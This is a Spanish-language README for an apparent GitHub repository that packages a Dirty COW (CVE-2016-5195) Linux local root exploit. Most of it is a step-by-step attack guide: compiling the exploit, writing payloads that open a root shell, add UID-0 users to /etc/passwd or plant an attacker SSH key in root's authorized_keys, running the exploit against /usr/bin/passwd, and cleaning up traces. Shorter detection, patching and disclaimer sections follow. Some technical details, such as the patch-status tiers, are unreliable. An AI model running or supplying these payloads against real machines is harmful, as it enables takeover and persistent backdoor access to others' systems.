---
title: Dirty COW (CVE-2016-5195) - Exploit de Escalada de Privilegios
description: Subrutina en C para escalada de privilegios mediante explotación del CVE-2016-5195
author: hackingyseguridad
date: 2026-01-01
tags: [exploitation, privilege-escalation, cve-2016-5195, linux, c]
severity: Crítica
cvss: 7.8 (CVSS v3.1)
affected_versions: "2.6.22 - 4.8.2"
---

### Dirty COW (CVE-2016-5195) - Exploit de Escalada de Privilegios

### Descripción

**Dirty COW** (Copy-On-Write) es una vulnerabilidad de escalada de privilegios crítica en el kernel de Linux que afecta a versiones desde **2.6.22 (2007) hasta 4.8.2 (2016)**. Esta subrutina en C implementa un exploit funcional basado en el método **ptrace_pokedata** ("pokémon") que permite a un usuario no privilegiado obtener acceso root.

La vulnerabilidad reside en el mecanismo de copia-al-escribir (Copy-On-Write, COW) del kernel de Linux. Un atacante puede explotar una carrera de datos para modificar archivos de solo lectura propiedad de otros usuarios, incluido el binario `/usr/bin/passwd`, permitiendo la escalada de privilegios sin credenciales válidas.

### Información de Vulnerabilidad

| Propiedad | Valor |
|-----------|-------|
| **CVE** | CVE-2016-5195 |
| **CVSS v3.1** | 7.8 (Alto) |
| **Vector CVSS** | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| **Tipo de vulnerabilidad** | Carrera de datos (Race Condition) en Copy-On-Write |
| **Línea del kernel** | mm/gup.c |
| **Rango de versiones afectadas** | Linux 2.6.22 - 4.8.2 |
| **Fecha de divulgación** | 19 de octubre de 2016 |
| **Estado de parche** | Parcheado en Linux 4.8.3+ |
| **Impacto máximo** | Escalada local de privilegios a root |

---

### Vector de Ataque

### Mecanismo de Explotación

El exploit aprovecha una condición de carrera en el mecanismo Copy-On-Write (COW) del kernel:

1. **Fase de lectura**: Un hilo accede a un archivo de solo lectura mediante `mmap()`
2. **Fase de escritura**: Un segundo hilo intenta escribir en la misma página mediante `ptrace()`
3. **Ventana de carrera**: El kernel no sincroniza adecuadamente entre la lectura COW y la verificación de permisos
4. **Resultado**: La página se modifica antes de que el kernel verifique los permisos de escritura

### Requisitos Previos

| Requisito | Descripción |
|-----------|------------|
| **Acceso local** | Usuario sin privilegios con acceso shell en el sistema |
| **Arquitectura** | x86 (32-bit) o x86_64 (64-bit) |
| **Versión del kernel** | 2.6.22 ≤ kernel ≤ 4.8.2 |
| **Permisos** | NO se requieren permisos especiales (vulnerable desde usuario no privilegiado) |
| **Compilación** | GCC con soporte para pthread |

---

###  Fases Operacionales

### Fase 1: Reconocimiento del Sistema

Verificar si el sistema es vulnerable antes de ejecutar el exploit.

```bash
# Obtener la versión del kernel
uname -r

# Verificar la arquitectura del sistema
uname -m

# Comprobar si el kernel es vulnerable
kernel_version=$(uname -r | cut -d. -f1,2)
echo "Versión del kernel: $kernel_version"

# Listar compiladores disponibles
which gcc
gcc --version
```

**Tabla de Versiones Vulnerables:**

| Versión del Kernel | Estado | Exploitable |
|--------------------|--------|-------------|
| < 2.6.22 | No vulnerable | ❌ |
| 2.6.22 - 4.8.2 | **Vulnerable** | ✅ |
| 4.8.3 - 4.11.x | Parcheado (parcialmente) | ⚠️ |
| 4.12+ | Completamente parcheado | ❌ |

### Fase 2: Compilación y Preparación

Compilar los exploit binarios y la carga útil.

```bash
# Clonar el repositorio
git clone https://github.com/hackingyseguridad/dirtycow.git
cd dirtycow

# Compilar el exploit para la arquitectura actual
make

# Verificar los binarios generados
ls -lh dc32 dc64 pl32 pl64

# Hacer ejecutables
chmod +x dc32 dc64
```

**Arquitecturas soportadas:**

| Binario | Arquitectura | Compilación Manual |
|---------|--------------|-------------------|
| `dc32` | x86 (32-bit) | `gcc -m32 -pthread dc.c -o dc32 -lcrypt` |
| `dc64` | x86_64 (64-bit) | `gcc -m64 -pthread dc.c -o dc64 -lcrypt` |
| `pl32` | x86 (32-bit) payload | `gcc -m32 pl32.c -o pl32` |
| `pl64` | x86_64 (64-bit) payload | `gcc -m64 pl64.c -o pl64` |

### Fase 3: Creación de Carga Útil (Payload)

Preparar el script que se ejecutará como root.

```bash
# Crear el script de carga útil personalizada
cat > /tmp/pl.sh << 'EOF'
#!/bin/bash

# Obtener acceso root interactivo
/bin/bash -i

EOF

# O crear un script que añada un nuevo usuario root
cat > /tmp/pl.sh << 'EOF'
#!/bin/bash

# Añadir nuevo usuario con UID 0 (root)
echo "hacker:$(openssl passwd -crypt password123):0:0::/root:/bin/bash" >> /etc/passwd

# Restaurar permisos
chmod 644 /etc/passwd

EOF

chmod +x /tmp/pl.sh
```

**Opciones de payload común:**

| Payload | Acción | Riesgo | Detección |
|---------|--------|--------|-----------|
| `/bin/bash -i` | Shell interactivo root | Bajo | Media |
| Añadir usuario `/etc/passwd` | Usuario root adicional | Medio | Alta |
| Modificar sudoers | Sudo sin contraseña | Alto | Alta |
| Instalar backdoor SSH | Acceso persistente | Crítico | Media |
| Volcado de `/etc/shadow` | Hashes de contraseña | Medio | Media |

### Fase 4: Explotación del CVE-2016-5195

Ejecutar el exploit principal contra el binario de `/usr/bin/passwd`.

```bash
# Determinar la arquitectura del sistema
ARCH=$(uname -m)

if [ "$ARCH" = "x86_64" ]; then
    EXPLOIT="./dc64"
else
    EXPLOIT="./dc32"
fi

echo "[*] Iniciando exploit Dirty COW..."
echo "[*] Arquitectura detectada: $ARCH"
echo "[*] Usando exploit: $EXPLOIT"
echo "[*] El proceso puede tardar 1-5 minutos..."

# Ejecutar el exploit
$EXPLOIT /usr/bin/passwd /tmp/pl.sh

# Monitorizar el progreso
sleep 2
ps aux | grep -E 'dc32|dc64|pl\.sh' | grep -v grep
```

**Proceso de explotación:**

| Paso | Descripción | Tiempo | Estado |
|------|-------------|--------|--------|
| 1 | Mapear `/usr/bin/passwd` en memoria | < 1s | ✓ |
| 2 | Iniciar hilo de lectura (reader) | < 1s | ✓ |
| 3 | Iniciar hilo de escritura (writer) | < 1s | ✓ |
| 4 | Crear proceso ptrace para acceso kernel | < 1s | ✓ |
| 5 | Fase de carrera (race condition) | 30-300s | ⏳ |
| 6 | Sobreescribir `/usr/bin/passwd` | < 1s | ✓ |
| 7 | Verificar modificación | < 1s | ✓ |

### Fase 5: Verificación y Limpieza

Confirmar la ejecución exitosa y restaurar el sistema.

```bash
# Verificar que el exploit completó
echo "[*] Comprobando si la explotación fue exitosa..."

# Buscar el archivo de backup
if [ -f /tmp/passwd.bak ]; then
    echo "[+] Backup de /usr/bin/passwd encontrado en /tmp/passwd.bak"
    ls -lh /tmp/passwd.bak
fi

# Verificar si el script fue ejecutado
if [ -f /tmp/pl.sh ]; then
    echo "[+] Script de payload todavía presente"
fi

# Buscar procesos relacionados
pgrep -f dc32 && echo "[!] dc32 aún en ejecución" || echo "[+] dc32 completado"
pgrep -f dc64 && echo "[!] dc64 aún en ejecución" || echo "[+] dc64 completado"

# Restaurar binarios originales (CRÍTICO)
if [ -f /tmp/passwd.bak ]; then
    echo "[*] Restaurando /usr/bin/passwd original..."
    cp /tmp/passwd.bak /usr/bin/passwd
    chmod 4755 /usr/bin/passwd
    echo "[+] Sistema restaurado"
fi

# Limpiar archivos de prueba
rm -f /tmp/pl.sh /tmp/passwd.bak
```

**Lista de verificación post-explotación:**

| Elemento | Acción | Crítico |
|----------|--------|---------|
| Binario passwd restaurado | Copiar backup a su ubicación original | ✓ CRÍTICO |
| Permisos restaurados | chmod 4755 /usr/bin/passwd | ✓ CRÍTICO |
| Archivos temporales borrados | rm /tmp/pl.sh /tmp/passwd.bak | ✓ CRÍTICO |
| Logs de auditoria | Revisar `/var/log/auth.log` si es necesario | ⚠️ Importante |
| Procesos cleanup | Terminar cualquier proceso huérfano | ⚠️ Importante |

---

### Estructura del Repositorio

```
dirtycow/
├── README.md              # Este archivo
├── LICENSE               # Licencia GPL-3.0
├── Makefile              # Construcción automatizada
├── dc.c                  # Código fuente del exploit principal
├── dc32                  # Binario compilado 32-bit
├── dc32bin               # Binario auxiliar 32-bit
├── dc64                  # Binario compilado 64-bit
├── dc64bin               # Binario auxiliar 64-bit
├── pl.sh                 # Script de carga útil (plantilla)
├── pl32.c                # Código payload 32-bit
└── pl64.c                # Código payload 64-bit
```

### Descripción de Archivos

| Archivo | Tipo | Propósito | Notas |
|---------|------|----------|-------|
| `dc.c` | Fuente C | Exploit principal con método ptrace_pokedata | Multithread, manejo de carrera |
| `dc32/dc64` | Ejecutable | Exploit compilado para cada arquitectura | Generados por make |
| `pl32.c/pl64.c` | Fuente C | Payloads inyectables para cada arquitectura | Integración con /tmp/pl.sh |
| `pl.sh` | Script bash | Payload personalizable ejecutado como root | Usuario debe crear antes de usar |
| `Makefile` | Configuración | Compilación automatizada para ambas arquitecturas | Maneja gcc -m32/-m64 |

---

## 💻 Ejemplos de Uso

### Ejemplo 1: Escalada Básica a Root

```bash
#!/bin/bash

# Script completo de escalada de privilegios

cd /tmp || exit 1

# Descargar o copiar el exploit
cp /path/to/dirtycow .
cd dirtycow

# Crear payload simple que lanza shell root
cat > pl.sh << 'PAYLOAD'
#!/bin/bash
/bin/bash
PAYLOAD

chmod +x pl.sh

# Detectar arquitectura
if [ "$(uname -m)" = "x86_64" ]; then
    ./dc64
else
    ./dc32
fi

# El usuario debería tener acceso root después
```

### Ejemplo 2: Añadir Usuario Root Persistente

```bash
#!/bin/bash

# Crear usuario adicional con UID 0

cat > /tmp/pl.sh << 'PAYLOAD'
#!/bin/bash

# Crear nuevo usuario 'pwned' con UID 0 (root)
# Formato: username:password_hash:uid:gid:fullname:home:shell

# Usar hash de contraseña (ejemplo: 'password123' encriptada)
echo "pwned:\$1\$Y/v5pClB\$J0NKZwJVGXcPPJ5S8K7Lg/:0:0:Compromised:/root:/bin/bash" >> /etc/passwd

echo "[+] Usuario pwned creado con UID 0"
PAYLOAD

chmod +x /tmp/pl.sh

# Compilar según arquitectura
if [ "$(uname -m)" = "x86_64" ]; then
    gcc -m64 -pthread dc.c -o dc64 -lcrypt
    ./dc64 /usr/bin/passwd /tmp/pl.sh
else
    gcc -m32 -pthread dc.c -o dc32 -lcrypt
    ./dc32 /usr/bin/passwd /tmp/pl.sh
fi

# Verificar si el usuario fue creado
sleep 2
grep pwned /etc/passwd
```

### Ejemplo 3: Inyección de Claves SSH Públicas

```bash
#!/bin/bash

# Inyectar clave SSH pública en ~/.ssh/authorized_keys del root

cat > /tmp/pl.sh << 'PAYLOAD'
#!/bin/bash

# Asegurar que ~/.ssh existe
mkdir -p /root/.ssh
chmod 700 /root/.ssh

# Añadir clave pública (reemplazar con tu clave pública real)
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... hacker@attacker" >> /root/.ssh/authorized_keys

chmod 600 /root/.ssh/authorized_keys
echo "[+] Clave SSH inyectada"
PAYLOAD

chmod +x /tmp/pl.sh

# Ejecutar exploit
if [ "$(uname -m)" = "x86_64" ]; then
    ./dc64 /usr/bin/passwd /tmp/pl.sh
else
    ./dc32 /usr/bin/passwd /tmp/pl.sh
fi
```

---

### 🔧 Compilación Manual

Si el Makefile no funciona o necesitas ajustes específicos:

```bash
# 64-bit (x86_64)
gcc -m64 -pthread dc.c -o dc64 -lcrypt

# 32-bit (x86)
gcc -m32 -pthread dc.c -o dc32 -lcrypt

# Con opciones de depuración
gcc -m64 -pthread -g -O2 dc.c -o dc64_debug -lcrypt

# Compilación estática
gcc -m64 -pthread -static dc.c -o dc64_static -lcrypt

# Verificar símbolos
nm dc64 | grep pthread
```

**Dependencias de compilación:**

```bash
# Ubuntu/Debian
sudo apt-get install build-essential gcc-multilib libc6-dev-i386

# CentOS/RHEL
sudo yum install gcc glibc-devel glibc-devel.i686

# Fedora
sudo dnf install gcc glibc-devel glibc-devel.i686
```

---

### Detección y Mitigación

### Detección de Intento de Explotación

| Indicador | Método de Detección | Herramienta |
|-----------|-------------------|------------|
| **Acceso a /usr/bin/passwd** | monitorizar syscalls | `strace`, `auditd` |
| **Uso de ptrace** | auditoría kernel | `auditctl -a always -S ptrace` |
| **Procesos multithread** | pgrep con parámetros | `ps -eLf` |
| **mmap anómalo** | análisis de memoria | `/proc/[pid]/maps` |
| **Archivos temporales** | escaneo de /tmp | `find /tmp -type f -perm -755` |

### Mitigación y Parches

| Método | Efectividad | Facilidad |
|--------|------------|----------|
| Actualizar kernel a 4.8.3+ | ✓ Completa | Media |
| Parche manual (CVE-2016-5195) | ✓ Completa | Difícil |
| SELinux/AppArmor strict | ✓ Parcial | Media |
| Monitoreo de auditoria | ✓ Detección | Fácil |
| Restricción permisos sudo | ✓ Prevención | Fácil |

**Verificar si el sistema está parcheado:**

```bash
# Comprobar versión del kernel
uname -r

# Intentar reproducir en entorno aislado
# Si falla = sistema parcheado
# Si funciona = sistema vulnerable

# Búsqueda de parches aplicados
grep -i "cow\|5195" /var/log/apt/history.log
rpm -qa | grep -i kernel | sort -V
```

---

## 📚 Referencias Técnicas

### CVE y Recursos Oficiales

| Recurso | URL | Contenido |
|---------|-----|----------|
| **Exploit-DB** | https://www.exploit-db.com/exploits/40616/ | POC original |
| **Dirty COW Oficial** | https://dirtycow.ninja/ | Wiki y desafíos |
| **GitHub Dirty COW** | https://github.com/dirtycow/ | Repositorio oficial |
| **NVD CVE** | https://nvd.nist.gov/vuln/detail/CVE-2016-5195 | Información NIST |
| **Kernel.org** | https://www.kernel.org/ | Parches del kernel |

### Artículos Técnicos

- **Phil Oester (2016)**: "Dirty COW - A Race Condition in Copy-On-Write" - Análisis técnico detallado
- **Linux Security Mailing List**: Discusión del parche y mitigation strategies
- **Academic**: Research sobre race conditions en mecanismos COW del kernel

### Métodos de Explotación Alternativos

| Método | Descripción | Ventajas | Desventajas |
|--------|------------|----------|------------|
| **ptrace_pokedata (Pokémon)** | Uso de ptrace para escritura kernel | Confiable | Detectable |
| **madvise_willneed** | Abuso del subsistema de memoria | Rápido | Limitado a ciertos kernels |
| **mmap + MADV_DONTNEED** | Manipulación del caché COW | Flexible | Complejo |
| **Overwrite libc** | Modificar biblioteca compartida | Potente | Alto impacto del sistema |

---

## ⚖️ Disclaimer Legal

### Advertencia Importante

Este código y herramientas se proporcionan **únicamente con fines educativos y de investigación de seguridad autorizada**. El acceso no autorizado a sistemas informáticos es ilegal.

### Legislación Aplicable

**España - Código Penal:**
- **Art. 197-198 CP**: Acceso ilícito a sistemas informáticos
  - Acceso sin autorización: 3 meses - 2 años de cárcel
  - Difusión de vulnerabilidades: Agravación de pena
  - Daño a datos o sistemas: Hasta 5 años de cárcel

**Unión Europea:**
- **Directiva 2013/40/UE**: Ataques contra sistemas de información
- **RGPD Art. 32-33**: Seguridad de datos personales

**Responsabilidades del Usuario:**

```
✓ El usuario es responsable exclusivo de cualquier uso de estas herramientas
✓ Se debe obtener consentimiento escrito previo de los propietarios del sistema
✓ El uso en sistemas no autorizados constituye delito informático
✓ hackingyseguridad.com NO se responsabiliza de uso malintencionado
✓ La distribución no autorizada de exploits violeta leyes de DMCA/LSSI
```

---

### Mejores Prácticas de Seguridad

### Entorno de Prueba Seguro

```bash
# Usar máquinas virtuales aisladas
# Versiones vulnerable: Ubuntu 14.04 LTS, Debian 7, CentOS 6

# NO EJECUTAR EN:
# - Servidores de producción
# - Sistemas con datos sensibles
# - Redes corporativas
# - Sistemas conectados a internet sin air-gap

# ENTORNO RECOMENDADO:
# - VirtualBox/KVM isolated
# - Red interna solo (no bridging)
# - Snapshot antes de cada prueba
# - Kernel 2.6.22 - 4.8.2 específicamente
```

### Registro y Auditoría

```bash
# Habilitar auditoría antes de pruebas
sudo auditctl -a always,exit -F arch=b64 -S ptrace,mmap -F auid>=1000 -F auid!=-1 -k dirtycow_test

# Monitorizar intentos de explotación
sudo tail -f /var/log/audit/audit.log | grep ptrace

# Analizar después de la prueba
sudo ausearch -k dirtycow_test
```

---

### Estado del Exploit en Diferentes Distribuciones

| Distribución | Versión Vulnerable | Parcheada | Estado |
|--------------|-------------------|-----------|--------|
| Ubuntu | 14.04 LTS - 16.04 | 16.04.1+ | ✓ Parcheada |
| Debian | 7 (Wheezy), 8 (Jessie) | 8.6+ | ✓ Parcheada |
| CentOS | 6, 7 | 7.2.1511+ | ✓ Parcheada |
| Fedora | 23, 24 | 25+ | ✓ Parcheada |
| Alpine | < 3.5 | 3.5+ | ✓ Parcheada |
| Android | 4.0 - 6.0.1 | 7.0+ | ✓ Parcheada |
| Raspbian | Jessie | Stretch+ | ✓ Parcheada |

---

### Testing y Validación

### Script de Validación de Vulnerabilidad

```bash
#!/bin/bash
# Script para verificar si el sistema es vulnerable a Dirty COW

echo "[*] Validador de Vulnerabilidad Dirty COW (CVE-2016-5195)"
echo ""

# Obtener versión del kernel
KERNEL=$(uname -r)
KERNEL_NUM=$(echo $KERNEL | cut -d. -f1,2,3 | tr -d 'v')

echo "[*] Versión del kernel: $KERNEL"
echo "[*] Versión numerada: $KERNEL_NUM"

# Parsear versión
MAJOR=$(echo $KERNEL_NUM | cut -d. -f1)
MINOR=$(echo $KERNEL_NUM | cut -d. -f2)
PATCH=$(echo $KERNEL_NUM | cut -d. -f3)

# Lógica de vulnerabilidad
if (( MAJOR < 2 )); then
    echo "[-] No vulnerable (kernel muy antiguo)"
elif (( MAJOR == 2 && MINOR == 6 && PATCH >= 22 )) || (( MAJOR > 2 )); then
    if (( MAJOR == 4 && MINOR > 8 )) || (( MAJOR == 4 && MINOR == 8 && PATCH >= 3 )); then
        echo "[-] No vulnerable (parcheado en kernel 4.8.3+)"
    else
        echo "[+] ¡VULNERABLE! Sistema afectado por Dirty COW"
        echo "[!] Actualizar kernel inmediatamente"
    fi
fi

# Verificar disponibilidad de compilador
if command -v gcc &> /dev/null; then
    GCC_VERSION=$(gcc --version | head -n1)
    echo "[+] GCC disponible: $GCC_VERSION"
else
    echo "[-] GCC no disponible"
fi

# Verificar disponibilidad de pthread
if ldconfig -p | grep -q libpthread; then
    echo "[+] libpthread disponible"
else
    echo "[-] libpthread no disponible"
fi
```

---

### Siguientes Pasos y Recursos

### Para Investigadores de Seguridad

1. **Análisis del código fuente** de dc.c
2. **Estudio de la ventana de carrera** en mm/gup.c del kernel
3. **Pruebas en laboratorio aislado** con diferentes versiones de kernel
4. **Análisis forense** de sistemas comprometidos
5. **Desarrollo de detección** mediante YARA/SIGMA

### Recursos de Aprendizaje

- Documentación del kernel de Linux sobre Copy-On-Write
- "Understanding Linux Kernel" - Daniel P. Bovet
- LWN.net articles sobre CVE-2016-5195
- Blog de dirtycow.ninja con desafíos técnicos

---



### Aviso de Responsabilidad final

```
┌─────────────────────────────────────────────────────────────────┐
│ HERRAMIENTA CON FINES EDUCATIVOS Y DE PRUEBAS AUTORIZADAS      │
│                                                                   │
│ El usuario asume toda responsabilidad legal por el uso          │
│ de este software. El acceso no autorizado a sistemas es DELITO. │
│                                                                   │
│ Cumplir con: Código Penal español, LSSI-CE, RGPD, CFAA (USA)   │
│                                                                   │
│ hackingyseguridad.com no se responsabiliza de mal uso.          │
└─────────────────────────────────────────────────────────────────┘
```

#
http://www.hackingysguridad.com/
#
